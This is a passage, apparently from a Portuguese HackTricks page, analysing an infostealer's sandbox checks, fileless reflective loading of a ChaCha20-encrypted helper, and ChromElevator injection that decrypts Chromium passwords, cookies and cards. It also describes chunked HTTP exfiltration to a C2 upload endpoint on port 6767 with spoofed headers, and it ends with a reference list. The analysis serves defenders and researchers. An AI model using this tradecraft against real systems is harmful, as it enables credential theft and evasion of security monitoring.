- A variante B inspeciona propriedades do sistema (limite mínimo de processos, uptime recente), chama `OpenServiceA("VBoxGuest")` para detectar adições do VirtualBox e realiza verificações de temporização em torno de sleeps para identificar single-stepping. Qualquer detecção aborta a execução antes do lançamento dos módulos.

### Helper fileless + reflective loading com ChaCha20 duplo

- A DLL/EXE primária incorpora um credential helper do Chromium que é gravado no disco ou manualmente mapeado na memória; o modo fileless resolve sozinho as imports/relocations, portanto nenhum artefato do helper é gravado.
- Esse helper armazena uma DLL de segundo estágio criptografada duas vezes com ChaCha20 (duas chaves de 32 bytes + nonces de 12 bytes). Após os dois passes, ele carrega o blob reflectivamente (sem `LoadLibrary`) e chama as exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas do [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- As rotinas do ChromElevator usam process hollowing reflectivo com direct-syscall para injetar em um browser Chromium ativo, herdar chaves do AppBound Encryption e descriptografar passwords/cookies/cartões de crédito diretamente de bancos de dados SQLite, apesar do hardening do ABE.


### Coleta modular em memória e exfiltração HTTP em chunks

- `create_memory_based_log` itera sobre uma tabela global de function pointers `memory_generators` e cria uma thread por módulo habilitado (Telegram, Discord, Steam, screenshots, documentos, browser extensions etc.). Cada thread grava os resultados em buffers compartilhados e informa sua contagem de arquivos após uma janela de join de aproximadamente 45 s.
- Ao terminar, tudo é compactado com a biblioteca `miniz` estaticamente vinculada como `%TEMP%\\Log.zip`. Em seguida, `ThreadPayload1` aguarda 15 s e transmite o arquivo em chunks de 10 MB via HTTP POST para `http://<C2>:6767/upload`, falsificando um boundary de browser `multipart/form-data` (`----WebKitFormBoundary***`). Cada chunk adiciona `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, e o último chunk acrescenta `complete: true` para que o C2 saiba que a remontagem foi concluída.

## References

- [1] [Tradecraft avançado de evasão: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: chega de passes livres para malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentação](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC com call-stack spoofing](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nova cadeia de infecção e obfuscation baseada em ConfuserEx para o DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Você deve confiar no seu zero trust? Bypass de verificações de postura do Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes do ToolShell: explorando as operações anteriores de ransomware do Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abusando de exports encaminhadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventário de Forwarded Exports do Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – ordem de pesquisa de dynamic-link libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – segurança de processos e direitos de acesso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – referência de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [launcher CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – combatendo EDRs com o suporte do Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – quebrando a protective shell do Windows Defender com a técnica de Folder Redirect](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – referência do comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sob a Pure Curtain: de RAT a builder e coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer está chegando à cidade: um novo e ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – descriptografia do Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: derrotando malware Node.js com API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: colocando o Adaptix para dormir com Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET e Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation de sleep do Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – ocultando o Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – abusando do Chrome Remote Desktop em operações de Red Team: um guia prático](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: weaponizing o remediation driver do Defender como primitive de operação no kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Código complementar do Function Peekaboo da MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: criando self-masking functions com LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
{{#include ../banners/hacktricks-training.md}}
